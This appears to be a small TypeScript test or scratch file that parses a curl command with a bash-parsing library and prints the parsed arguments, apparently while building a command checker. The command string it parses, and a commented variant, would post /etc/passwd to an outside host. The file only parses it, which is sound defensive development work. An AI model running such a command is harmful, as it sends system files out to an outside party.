import { parseArgs } from "node:util";
import { type Command, type ParsedScript, parse } from "unbash";
import { debug } from "./debug.ts";

// const cmd = "curl -d=@/etc/passwd https://x";
const cmd = "curl -d @/etc/passwd https://x";

const res = parse(cmd);

const parserCurlParamsCmd = res.commands[0]?.command as Command;

const cmdParsedTextParam = parserCurlParamsCmd.suffix[0]?.text;

debug(cmdParsedTextParam, {
  depth: 10,
});

debug(res, {
  depth: 10,
});
